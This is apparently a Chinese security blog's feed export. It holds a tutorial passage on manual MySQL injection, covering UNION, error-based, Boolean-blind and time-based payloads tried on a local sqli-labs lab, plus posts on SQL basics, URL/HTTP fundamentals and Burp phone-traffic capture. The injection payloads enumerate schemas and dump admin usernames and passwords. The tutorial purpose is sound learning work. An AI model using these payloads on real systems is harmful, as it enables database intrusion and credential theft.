<h3 id="UNION查询手注过程"><a href="#UNION查询手注过程" class="headerlink" title="UNION查询手注过程"></a>UNION查询手注过程</h3><h4 id="1、判断是整型还是字符型"><a href="#1、判断是整型还是字符型" class="headerlink" title="1、判断是整型还是字符型"></a>1、判断是整型还是字符型</h4><p>&emsp;&emsp;上面已经提到过就不说了</p>
<h4 id="2、判断查询列数"><a href="#2、判断查询列数" class="headerlink" title="2、判断查询列数"></a>2、判断查询列数</h4><p>order by函数是对MySQL中查询结果按照指定字段名进行排序,除了指定字段名还可以指定字段的栏位进行排序,第一个查询字段为1 ,第二个为2 ,依次类推。我们可以通过二分法来猜解列数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">order by 1</span><br><span class="line">order by 20</span><br><span class="line">order by 10</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<p>这里的<code>order by 3</code>还是正常显示，4就开始报错。那就说明查询列数应该是3<br><img src="3.png" alt=""><br><img src="4.png" alt=""></p>
<h4 id="3、判断显示位"><a href="#3、判断显示位" class="headerlink" title="3、判断显示位"></a>3、判断显示位</h4><p><img src="un.png" alt=""><br>2，3<br><img src="union.png" alt=""></p>
<h4 id="4、获取所有数据库名"><a href="#4、获取所有数据库名" class="headerlink" title="4、获取所有数据库名"></a>4、获取所有数据库名</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">group_concat() 一次性显示:</span><br><span class="line">select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA;</span><br><span class="line">limit 逐一显示:</span><br><span class="line">select count(SCHEMA_NAME) from information_schema.SCHEMATA; 		#查询数据库个数</span><br><span class="line">select SCHEMA_NAME from information_schema.SCHEMATA limit 0,1;</span><br></pre></td></tr></table></figure>
<h4 id="5、获取数据库-test-所有表名"><a href="#5、获取数据库-test-所有表名" class="headerlink" title="5、获取数据库(test)所有表名"></a>5、获取数据库(test)所有表名</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">group_concat() 一次性显示:</span><br><span class="line">select group_concat(TABLE_NAME) from information_schema.TABLES where table_schema&#x3D;&#39;test&#39;;</span><br><span class="line">limit 逐一显示:</span><br><span class="line">select count(TABLE_NAME) from information_schema.TABLES where table_schema&#x3D;&#39;test&#39;;		#查询表的个数</span><br><span class="line">select TABLE_NAME from information_schema.SCHEMATA where table_schema&#x3D;&#39;test&#39; limit 0,1;</span><br></pre></td></tr></table></figure>
<p>两个显示位，就可以直接查数据库名和所有表名了<del><code>mysql</code>的所有表名,接下来查下去的东西也就直接放查询语句了</del><br><img src="mysql.png" alt=""></p>
<h4 id="6、获取-数据库-test-表-admin-中所有字段名"><a href="#6、获取-数据库-test-表-admin-中所有字段名" class="headerlink" title="6、获取(数据库:test,表:admin)中所有字段名"></a>6、获取(数据库:test,表:admin)中所有字段名</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">group_concat() 一次性显示:</span><br><span class="line">select group_concat(COLUMN_NAME) from information_schema.COLUMNS where table_schema&#x3D;&#39;test&#39; and table_name&#x3D;&#39;admin&#39;;</span><br><span class="line">limit 逐一显示:</span><br><span class="line">select count(COLUMN_NAME) from information_schema.COLUMNS where table_schema&#x3D;&#39;test&#39; and table_name&#x3D;&#39;admin&#39;;		#查询字段总个数</span><br><span class="line">select COLUMN_NAME from information_schema.COLUMNS where table_schema&#x3D;&#39;test&#39; and table_name&#x3D;&#39;admin&#39; limit 0,1;</span><br></pre></td></tr></table></figure>
<h4 id="7、获取字段中的数据"><a href="#7、获取字段中的数据" class="headerlink" title="7、获取字段中的数据"></a>7、获取字段中的数据</h4><p>列出(数据库: test表: admin)中指定字段(username,password)中的数据:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">group_concat() 一次性显示:</span><br><span class="line">select group_concat(concat_ws (&#39;0x20&#39;,username,password)) from test.admin;</span><br><span class="line">limit 逐一显示:</span><br><span class="line">select count(*) from test.admin; 	#查询总共有多少行数据</span><br><span class="line">select username,password from test.admin limit 0,1;</span><br></pre></td></tr></table></figure>

<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h3><p>页面上没有显示位，但有<code>sql</code>语句执行错误信息输出/脚本语言报错</p>
<p><del>在用<code>PHP</code>对<code>MySQL</code>进行一些增删改查操作的时候 ,如果数据库在执行的过程中遇到错误,此时数据库是有错误回显的, 但是这个错误回显不会显示在Web应用页面中的。</del></p>
<h3 id="注入过程"><a href="#注入过程" class="headerlink" title="注入过程"></a>注入过程</h3><p>和一般的注入流程也是一样的，只是查询的时候稍微不一样</p>
<h3 id="函数总结"><a href="#函数总结" class="headerlink" title="函数总结"></a>函数总结</h3><h4 id="floor报错"><a href="#floor报错" class="headerlink" title="floor报错"></a>floor报错</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and (select 1 from (select count(*),concat((payload),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure>

<h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and extractvalue(1, payload)</span><br><span class="line">and extractvalue(1, concat(0x7e,@@version,0x7e))</span><br></pre></td></tr></table></figure>

<h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and updatexml(1,payload,1)</span><br><span class="line">and updatexml(1, concat(0x7e,@@version,0x7e),1)</span><br></pre></td></tr></table></figure>

<h5 id="updatexml测的sqllab1"><a href="#updatexml测的sqllab1" class="headerlink" title="updatexml测的sqllab1"></a>updatexml测的sqllab1</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;Less-1?id&#x3D;1&#39; and updatexml(1,user( ),1) --+</span><br></pre></td></tr></table></figure>
<p>user()显示不完全，可以改成下面这样多个字符串连接成一个字符串就可以显示更多东西了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;Less-1?id&#x3D;1&#39; and updatexmL( 1, concat(0x7e,user( ) ,0x7e) ,1) --+</span><br></pre></td></tr></table></figure>
<p>查询所有数据库：受到输出长度限制</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;Less-1?id&#x3D;1&#39; and updatexmL( 1, concat(0x7e,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) ,0x7e) ,1) --+</span><br></pre></td></tr></table></figure>

<p>可以通过限制查询条件一条一条的查,<code>limit 0,1</code>从第一个值开始查询</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select SCHEMA_NAME from information_schema.schemata limit 0,1</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select count(SCHEMA_NAME) from information_schema.schemata   #</span><br></pre></td></tr></table></figure>

<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><h3 id="前提-1"><a href="#前提-1" class="headerlink" title="前提"></a>前提</h3><p>页面中没有显示位，没有输出SQL语句执行错误信息。只能通过页面返回正常/不正常来判断存不存在注入。    缺点:速度太慢,耗费大量时间。</p>
<h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><h4 id="substr"><a href="#substr" class="headerlink" title="substr()"></a>substr()</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">substr (string, num start, num length)</span><br></pre></td></tr></table></figure>

<p>作用：截取字符串。(string:字符串  start:起始位置  length:长度)</p>
<h4 id="ascii"><a href="#ascii" class="headerlink" title="ascii()"></a>ascii()</h4><p>作用:返回字符串str的字符ASCII码值。<br>如果str是空字符串就返回0.如果string是NULL就返回NULL。</p>
<h3 id="布尔盲注过程"><a href="#布尔盲注过程" class="headerlink" title="布尔盲注过程"></a>布尔盲注过程</h3><h4 id="判断数据库个数"><a href="#判断数据库个数" class="headerlink" title="判断数据库个数"></a>判断数据库个数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1 and (select count(schema_name) from information_schema.schemata)&gt;8</span><br></pre></td></tr></table></figure>
<h4 id="判断第一个数据库名的字符长度"><a href="#判断第一个数据库名的字符长度" class="headerlink" title="判断第一个数据库名的字符长度"></a>判断第一个数据库名的字符长度</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1 and (select length(schema_name) from information_schema.schemata limit 0,1)&gt;18</span><br></pre></td></tr></table></figure>
<h4 id="判断第一个库的第一个字符"><a href="#判断第一个库的第一个字符" class="headerlink" title="判断第一个库的第一个字符"></a>判断第一个库的第一个字符</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1 and (select ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1)))&gt;105</span><br></pre></td></tr></table></figure>
<h4 id="判断第一个库的第二个字符"><a href="#判断第一个库的第二个字符" class="headerlink" title="判断第一个库的第二个字符"></a>判断第一个库的第二个字符</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1 and (select ascii(substr((select schema_name from information_schema.schemata limit 0,1),2,1)))&gt;110</span><br></pre></td></tr></table></figure>
<h4 id="依次找出剩下内容···"><a href="#依次找出剩下内容···" class="headerlink" title="依次找出剩下内容···"></a>依次找出剩下内容···</h4><p>用到<code>ascii()</code>就是借此利用二分法减少盲注次数</p>
<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><h3 id="前提-2"><a href="#前提-2" class="headerlink" title="前提"></a>前提</h3><p>页面上没有显示位,也没有输出SQL语句执行错误信息。正确的SQL语句和错误的SQL语句返回页面都一样,但是加入<code>sleep(5)</code>条件之后,页面的返回速度明显慢了5秒。</p>
<h3 id="if-函数"><a href="#if-函数" class="headerlink" title="if()函数"></a>if()函数</h3><pre><code>IF(Condition,A,B)
当Condition为TRUE时,返回A。
当Condition为False时,返回B。</code></pre><h3 id="注入过程-1"><a href="#注入过程-1" class="headerlink" title="注入过程"></a>注入过程</h3><p>判断数据库个数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1 and if((select count(schema_name) from information_schema.schemata)&#x3D;9,sleep(5),1)</span><br></pre></td></tr></table></figure>
<p>判断第一个数据库名有多少个字符</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1 and if((select length(schema_name) from information_schema.schemata limit 0,1)&#x3D;18,S leep(5),1)</span><br></pre></td></tr></table></figure>
<p>判断第一个库第一个字符</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1 and if((select ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1)))&#x3D;105,sleep(5),1)&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
<p>判断第一个库第二个字符</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1 and if((select ascii(substr((select schema_name from information_schema.schemata limit 0,1),2,1)))&#x3D;110,sleep(5),1)&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>sql基础</title>
    <url>/2020/04/12/sql%E5%8E%9F%E7%90%86/</url>
    <content><![CDATA[<h2 id="注入原理"><a href="#注入原理" class="headerlink" title="注入原理"></a>注入原理</h2><p>结构化查询语言(Structured Query Language)简称SQL ,它是一种特殊目的的编程语言<a id="more"></a>,是一种数据库查询和程序设计语言,用于存取数据以及查询、更新和管理关系数据库系统;同时也是数据库脚本文件的扩展名。使用sql正常的查询流程应该是这样<br><img src="sql.png" alt=""><br>但客户端发送到服务器的参数是用户可控的，可以构造适当的语法破坏原有SQL结构达到编写程序时意料之外结果的攻击行为。其构成sql注入原因可以归结为以下两个方面叠加造成的:<br>1.程序编写者在处理应用程序和数据库交互时,使用字符串拼接的方式构造SQL语句。<br>2.未对用户可控参数进行足够的过滤便将参数内容拼接进入到SQL查询语句中。<br>如果程序登录验证模块的SQL语句是这样构成的:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select*from admin where username&#x3D; &#39; $username&#39; and passwd&#x3D; &#39;$password&#39;</span><br></pre></td></tr></table></figure>
<p>这个时候在当我们用户名输入<code>&#39;or 1=1#</code>密码输入<code>12345</code>时, SQL语句就变成了:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select*from admin where username&#x3D;&#39;&#39; or 1&#x3D;1#&#39; and passwd&#x3D; &#39;12345&#39;</span><br></pre></td></tr></table></figure>
<p><img src="sql2.png" alt=""><br>这时就构成万能密码了</p>
<h2 id="sql注入常用的mysql函数"><a href="#sql注入常用的mysql函数" class="headerlink" title="sql注入常用的mysql函数"></a>sql注入常用的mysql函数</h2><h3 id="MySQL中三种注释"><a href="#MySQL中三种注释" class="headerlink" title="MySQL中三种注释"></a>MySQL中三种注释</h3><p>➢<code>&quot;#”</code> (url编码为%23)<br>➢<code>&quot;-- &quot;</code> (–后边要跟上一个或多个空格)<br>➢<code>/*..... */”</code><br>➢<code>&quot;/*! .... */&quot;</code> 内敛注释<br>注: <code>&quot;#&quot;</code> 在URL中会被认为是锚点,想用的时候需要进行编码，<code>“+”</code> 在URL中会被当做空格,因此可以使用<code>-- +</code>来进行注释。</p>
<h3 id="常用mysql函数"><a href="#常用mysql函数" class="headerlink" title="常用mysql函数"></a>常用mysql函数</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">➢user( )</span><br><span class="line">select user();   #查看当前连接数据库用户</span><br><span class="line">➢database( )</span><br><span class="line">select database();   #查看当前连接数据库名称</span><br><span class="line">➢version( )</span><br><span class="line">select version();  #查看当前数据库版本信息</span><br><span class="line">➢@ @datadir</span><br><span class="line">select @ @datadir;   #数据库文件存放目录</span><br><span class="line">➢@@version_ compile_ _oS</span><br><span class="line">@@version_ compile_ _os   #查看当前使用操作系统</span><br></pre></td></tr></table></figure>
<h3 id="连接字符串函数"><a href="#连接字符串函数" class="headerlink" title="连接字符串函数"></a>连接字符串函数</h3><p>➢concat(str1,str2,str….)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select concat(&#39;ada&#39;,&#39;dsf&#39;,&#39;dss&#39;);</span><br></pre></td></tr></table></figure>
<p>该函数作用是返回串联参数的结果的字符串。可能有一个或多个参数。说的通俗一点就是没有分隔符的连接字符串。<br>➢concat_ Ws(separator, str1,str2…)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select concat_ws(&#39;~&#39;,&#39;ada&#39;,&#39;dsf&#39;,&#39;dss&#39;);</span><br></pre></td></tr></table></figure>
<p>concat_ws( )是concat( )的一种特殊形式,该函数第一个参数是其他参数的分隔符。分隔符在连接字符串之间加入。<br>➢group_concat(str1,str2,….)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select group_concat(uid,username) frome jfslk;</span><br></pre></td></tr></table></figure>
<p>将多行的查询结果以逗号为分隔符连接成为一行结果。</p>
<h2 id="INFORMATION-SCHEMA库"><a href="#INFORMATION-SCHEMA库" class="headerlink" title="INFORMATION_SCHEMA库"></a>INFORMATION_SCHEMA库</h2><p>在<code>MySQL &gt;= 5.0</code>版本中才自带的库,它提供了访问数据库元数据的方式,元数据就是关于数据的数据,如数据库名或表名列的数据类型,或访问权限等等。</p>
<h3 id="SCHEMATA表"><a href="#SCHEMATA表" class="headerlink" title="SCHEMATA表"></a>SCHEMATA表</h3><p>表: SCHEMATA （提供了当前MySQL中所有数据库库名信息。show databases;的结果就是取之此表。）<br>字段: SCHEMA_NAME（数据库名）<br>查询所有数据库名称：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select SCHEMA_NAME from INFORMATION_SCHEMA.SCHEMATA;</span><br></pre></td></tr></table></figure>
<h3 id="TABLES表"><a href="#TABLES表" class="headerlink" title="TABLES表"></a>TABLES表</h3><p>表: TABLES  （提供了关于数据库中的表的信息。详细表述了 某个表属于哪个库,表类型,表引擎,创建时间等信息。）<br>字段: TABLE_NAME  （表名）,TABLE_ SCHEMA （数据库名）<br>查询指定数据库（test）中所有的表名:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select TABLE_NAME from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA&#x3D;&#39;test&#39;;</span><br></pre></td></tr></table></figure>
<h3 id="COLUMNS表"><a href="#COLUMNS表" class="headerlink" title="COLUMNS表"></a>COLUMNS表</h3><p>表: COLUMNS  （提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。）<br>字段: COLUMN_ NAME（字段名）,TABLE_ NAME（表名）,TABLE_ SCHEMA (数据库名)<br>查询指定数据库( test )中指定表( admin )的所有字段名:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Select COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where TABLE_SCHEMA&#x3D;&#39;test&#39; and TABLE_NAME&#x3D;&#39;admin&#39;;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>web基础</title>
    <url>/2020/04/11/web%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<p>●万维网:<code>World Wide Web</code>是一种基于超文本和HTTP的、全球性的<a id="more"></a>、动态交互的、跨平台的分布式图形信息系统。为方便浏览者在Internet上查找和浏览信息提供了图形化的、易于访问的直观界面而建立在Internet上的一种网络服务。<br>●因特网:是指连接计算机的网络是由于许多小的网络(子网)互联而成的一个逻辑网，每个子网中连接着若干台计算机(主机)。<br>●超文本:Hypertext,是一种可以显示在电脑显示器或其他电子设备的文本，超文本是用超链接的方法，将各种不同空间的文字信息组织在一起的网状文本。<br>●域名:Domain Name<br>Ip地址: <code>0.0.0.0 ~ 255.255.255.255</code>是由一串用点分隔的名字组成的Internet_上某一台计算机或计算机组的名称，用于在数据传输时对计算机的定位标识<br>●DNS:Domain Name Server是一种组织成域层次结构的计算机和网络服务命名系统,它所提供的服务是用来将主机名和域名转换为IP地址的工作<br><del>web前后端的交互和浏览器的工作流程就懒得写了，</del></p>
<h2 id="从认识url开始"><a href="#从认识url开始" class="headerlink" title="从认识url开始"></a>从认识url开始</h2><p>&emsp;&emsp;URL的全称统一资源定位符(Uniform Resource Locator),是对可以从互联网上得到的资源的位置和访问方法的一种简洁的表示，是互联网上标准资源的地址。互联网上的每个文件都有一个唯一的URL ,它包含的信息指出文件的位置以及浏览器应该怎么处理它。</p>
<h3 id="url组成："><a href="#url组成：" class="headerlink" title="url组成："></a>url组成：</h3><p><code>scheme:</code> <code>//</code> <code>login:password</code> <code>@address:</code> <code>port</code> <code>/path to resource</code> <code>?query_string</code> <code>#fragment</code></p>
<h3 id="scheme"><a href="#scheme" class="headerlink" title="scheme"></a>scheme</h3><p>Scheme就是用来指定使用的传输协议,其中最常见的就是HTTP协议。它也是互联网中应用最多的。<br>其它常用的协议还有:<br>    ➢file: 用于访问资源位于本地计算机上的文件。<br>    ➢ftp:用于访问FTP服务器上的资源。<br>    ➢https: 通过SSL协议的HTTP访问web服务器资源。<br>    ➢mailto:访问资源属于电子邮件地址,通过SMTP协议访问。<br>    ➢ed2k、 flashget、 thunde等 ,通过支持专用下载协议的P2P软件访问资源。</p>
<h3 id=""><a href="#" class="headerlink" title="//"></a>//</h3><p>这是URL层级URL标记符,根据RFC 1738规定的语法,在授权信息之前,每个层级结构的URL中都会包括固定的<code>&quot;//&quot;</code>符号。</p>
<p>非层级结构的URL: <code>mailto:</code></p>
<h3 id="login-password"><a href="#login-password" class="headerlink" title="login:password"></a>login:password</h3><p>访问资源的身份验证。<br>在URL中,身份验证属于可选项,在向服务器申请资源时,在某些情况下，需要指定一个用户名和密码。如果没有身份验证字段,浏览器默认以匿名的方式访问资源。</p>
<h3 id="address"><a href="#address" class="headerlink" title="@address:"></a>@address:</h3><p>完整的层级URL,必须有一个域名、IPv4或者IPv6地址作为请求服务器的位置。域名不区分大小写, IPv6需要括在方括号中。</p>
<h3 id="port"><a href="#port" class="headerlink" title="port"></a>port</h3><p>服务器端口是URL中可选内容,在没有指定端口时,会默认去访问协议的标准端口。如http的默认端口为80.基本上浏览器支持的协议都会有关联的默认服务接口。不过默认接口可以在URL中进行修改。</p>
<h3 id="path-to-resource"><a href="#path-to-resource" class="headerlink" title="/path to resource"></a>/path to resource</h3><p>URL的这部分被称为层级文件路径,这一结构来源自UNIX目录语义,因此保留了对<code>/../</code>,<code>/./</code>的支持。</p>
<h3 id="query-string"><a href="#query-string" class="headerlink" title="?query_string"></a>?query_string</h3><p>查询字符串是一个非必须的字段,只要负责将一系列非层级格式的任意参数传递给服务器。可同时传递多个参数,参数之间用”&amp;”符号连接,每个参数名与值用”=”隔开。</p>
<h3 id="fragment"><a href="#fragment" class="headerlink" title="#fragment"></a>#fragment</h3><p>片段ID同样是应用的位置有别于查询字符串,他应用于客户端,片段ID值并不会回传至服务端。在实际场景下,片段ID-般用于指向页面中的某个锚点,将片段ID与与预先设置的锚点名称匹配,并滚到相应的位置。</p>
<h2 id="浏览器对url解析流程"><a href="#浏览器对url解析流程" class="headerlink" title="浏览器对url解析流程"></a>浏览器对url解析流程</h2><h3 id="提取协议名"><a href="#提取协议名" class="headerlink" title="提取协议名"></a>提取协议名</h3><p>浏览器接收到url之后会查找第一个”:”, 找到左边的便是协议名。</p>
<h3 id="去除层级标识符"><a href="#去除层级标识符" class="headerlink" title="去除层级标识符"></a>去除层级标识符</h3><p>字符串//应该算跟在协议名后面的,如果发现有该字符则会跳过该字符,如果没有找到便不管了，所以http:baidu.com也是可以访问的。</p>
<h3 id="获取授权信息部分"><a href="#获取授权信息部分" class="headerlink" title="获取授权信息部分"></a>获取授权信息部分</h3><p>紧接着会依次扫描url,以/、?、#,那个先出现为准来截取URL，如果存在认证信息 ,提取出来的再查找@符号,如果找到, @符号左边便是登录信息。</p>
<h3 id="提取目标地址"><a href="#提取目标地址" class="headerlink" title="提取目标地址"></a>提取目标地址</h3><p>第3步提取授权信息之后@符号右边便是目标地址信息。目标地址信息第一个”:”分开的就是主机名和端口号。</p>
<h3 id="确认路径"><a href="#确认路径" class="headerlink" title="确认路径"></a>确认路径</h3><p>在目标地址部分结尾跟着一个正斜杠 ,接下来扫描?和#直至结尾,那个先出现便以那个为准,截取出来中间部分即路径信息。</p>
<h3 id="提取查询字符串"><a href="#提取查询字符串" class="headerlink" title="提取查询字符串"></a>提取查询字符串</h3><p>在第5步中,如果存在”?”, 便会扫描#或者至字符串结尾,中间部分便是查询字段。</p>
<h3 id="提取片段ID"><a href="#提取片段ID" class="headerlink" title="提取片段ID"></a>提取片段ID</h3><p>如果成功解析完上一条信息,它最后还跟着#号那么从这个符号到字符串的结尾便算片段ID了,片段ID是不会发送到服务器的! 一般用来跳到A标签的锚链接.</p>
<h2 id="http协议简介："><a href="#http协议简介：" class="headerlink" title="http协议简介："></a>http协议简介：</h2><h3 id="关于协议"><a href="#关于协议" class="headerlink" title="关于协议"></a>关于协议</h3><p>协议是指计算机通信网络中两台计算机之间进行通信所必须共同遵守的规定或规则。HTTP<code>( HyperText Transfer Protocol )</code>超文本传输协议,是从服务器传输超文本到本地浏览器的传输协议。</p>
<h3 id="http协议工作原理"><a href="#http协议工作原理" class="headerlink" title="http协议工作原理"></a>http协议工作原理</h3><h4 id="HTTP的请求-响应模式"><a href="#HTTP的请求-响应模式" class="headerlink" title="HTTP的请求/响应模式"></a>HTTP的请求/响应模式</h4><p>当用户通过浏览器访问<code>www.baidu.com</code>时会发生以下动作:<br>1、浏览器连接到服务器HTTP端口(默认80端口),建立一个TCP连接。<br>2、浏览器请求服务器上的index.html文档。<del>http请求报文</del><br>3、服务器给出响应,将文档index.htmI发送给浏览器。<del>http响应报文</del><br>4、传输完成，服务器主动关闭TCP连接。<br>5、浏览器解析渲染html内容,呈现给用户。</p>
<h4 id="HTTP连接方式"><a href="#HTTP连接方式" class="headerlink" title="HTTP连接方式"></a>HTTP连接方式</h4><p>●非持久性连接<br>浏览器每请求一个文档,就创建一个连接 ，当文档传输完成之后立即释放连接。对于请求Web页面中包含多个其他文档对象的链接时(如视频、图片、声音等)，每个请求链接都需要创建新的连接，效率底下。建立TCP连接请求文档1…<br>●持久性连接<br>即在一个连接中,可以进行多个文档的请求和响应HTTP有一个Connection字段,该字段为Keep-alive时, TCP连接会保持一段时间，等后续所有请求接受和完成时,断开连接。连接时间可由双方商定。<br>####➢HTTP的无状态性<br>无状态是指协议对事物的处理没有记忆能力,同一个浏览器第二次打开Web应用同一个页面时,服务器并不知道客户曾经访问过。例如:在你购物车加入几件商品之后,此时需要跳转到支付界面。无状态的特性导致服务器无法知道你选购哪些商品。此时就引用了Cookie和Session机制来维持会话。</p>
<h5 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h5><p>Cookie实际上是一小段的文本信息。客户端请求服务器,服务器就给客户端们颁发一个通行证,即Cookie。当浏览器再请求该网站时,浏览器把请求的网址连同该Cookie同提交给服务器。服务器检查该Cookie ,以此来辨认用户状态。</p>
<h5 id="session"><a href="#session" class="headerlink" title="session"></a>session</h5><p>Session是另一种记录客户状态的机制,不同的是Cookie保存在客户端浏览器中,而Session保存在服务器上。客户端浏览器访问服务器的时候,服务器把客户端信息以某种形式记录在服务器上。这就是Session。客户端浏览器再次访问时只需要从该Session中查找该客户的状态就可以了。</p>
<h2 id="http报文结构"><a href="#http报文结构" class="headerlink" title="http报文结构"></a>http报文结构</h2><h3 id="请求报文"><a href="#请求报文" class="headerlink" title="请求报文"></a>请求报文</h3><p><img src="get.jpg" alt=""><br>请求行<br>请求报文中的方法方法是对所请求对象进行的操作,也就是一种命令。请求报文中的方法有:<br>GET：请求获取一个Web页面<br>HEAD：与GET方法相似,区别在于只获取Web页面首部,不获取主体。<br>POST；主要作用是执行操作,比如向服务器提交一个表单。<br>PUT：请求向服务器上传指定的资源。<br>DELETE：请求删除一个Web页面<br>TRACE：用于测试,要求服务器返回收到的请求。<br>MOVE：请求移动某个页面到指定位置<br>OPTION：请求服务器所支持哪些方法。<br>请求头<br>请求消息头部字段说明:<br>Host：消息头用于指定出现在被访问的完整URL的主机名称。<br>User-Agent：这个消息头提供与浏览器或生成请求的其他客户端软件有关的信息。<br>Accept：这个消息头用于告诉服务器客户端愿意接受哪些内容，如图像类型、办公文档格式等。<br>AcceptLanguage：用于声明服务器浏览器可以支持什么语言。<br>Accept-Encoding：这个消息头用于告诉服务器，客户端愿意接受哪些内容编码。<br>Referer：这个消息头用于指示提出当前请求的原始URL。<br>Cookie：提交此服务器向客户端发送的其他参数(服务器使用Set-Cookie消息头来设置Cookie,一般用于身份验证)<br>Connection：通知通信的另一方，是否在完成HTTP传输后关闭TCP连接。<br>请求体</p>
<h3 id="响应报文"><a href="#响应报文" class="headerlink" title="响应报文"></a>响应报文</h3><p><img src="x.jpg" alt=""><br>响应行<br>状态码是响应报文状态行中包含的一个3位数字，指明请求是否被满足，如果没有满足，原因是什么。状态码分为以下五大类:<br>1xx：表示请求已接收，继续处理。（100:服务器正在处理客户请求。）<br>2xx：表示请求已被成功接收、理解、接受，（200 :请求成功。）<br>3xx：客户端被重定向到其他资源。</p>
<pre><code>301 :表示本网页永久性转移到另一个地址。
302 :重定向，浏览器自动跳转新连接。
304:上次文档已经缓存，还可以继续使用。</code></pre><p>4xx：请求有语法错误或请求无法实现。</p>
<pre><code>400 :请求语法有错误，服务器不能解析。
403 :拒绝提供服务。
404 :请求资源不存在。</code></pre><p>5xx：服务器执行请求时遇到错误。</p>
<pre><code>500 :服务器错误。
503 :服务器当前不能处理，请稍后再试。</code></pre><p>响应头<br>响应头部字段说明:<br>Date：响应返回的时间, GMT代表格林威治时间(北京市位于东8区,计北京时间要加8小时)。<br>Server：这个消息头提供所使用的Web服务器软件的相关信息。<br>Set-Cookie：这个消息头用于向浏览器发布cookie，浏览器会在随后的请求中将其返回给服务器。<br>Content-Type：这个消息头用于规定消息主体的内容类型。例如, HTML文档的内容类型为text/html.<br>Content-Length：这个消息头用于规定消息主体的字节长度。<br>Connection：通知通信的另一方，是否在完成HTTP传输后关闭TCP连接。</p>
<p>响应体</p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title>app数据包</title>
    <url>/2020/04/10/app%E6%95%B0%E6%8D%AE%E5%8C%85/</url>
    <content><![CDATA[<p>用wireshark就简单，设置好代理应该是可以抓到手机上的数据流量了<a id="more"></a>，但是说的Fiddler和burpsuite在抓包上偏向请求和响应的数据，而wireshark偏向于数据帧。那就还用burp呗~~</p>
<h2 id="手机上设置代理"><a href="#手机上设置代理" class="headerlink" title="手机上设置代理"></a>手机上设置代理</h2><img src="shouji.jpg" width="200px;" height="300px;" title="手机截图." alt="手机截图."/>

<h3 id="电脑上也一样"><a href="#电脑上也一样" class="headerlink" title="电脑上也一样"></a>电脑上也一样</h3><p><img src="diannao.png" alt=""></p>
<h3 id="看到应该是可以了吧，但这时候还没导入证书"><a href="#看到应该是可以了吧，但这时候还没导入证书" class="headerlink" title="看到应该是可以了吧，但这时候还没导入证书"></a>看到应该是可以了吧，但这时候还没导入证书</h3><p><img src="result.png" alt=""></p>
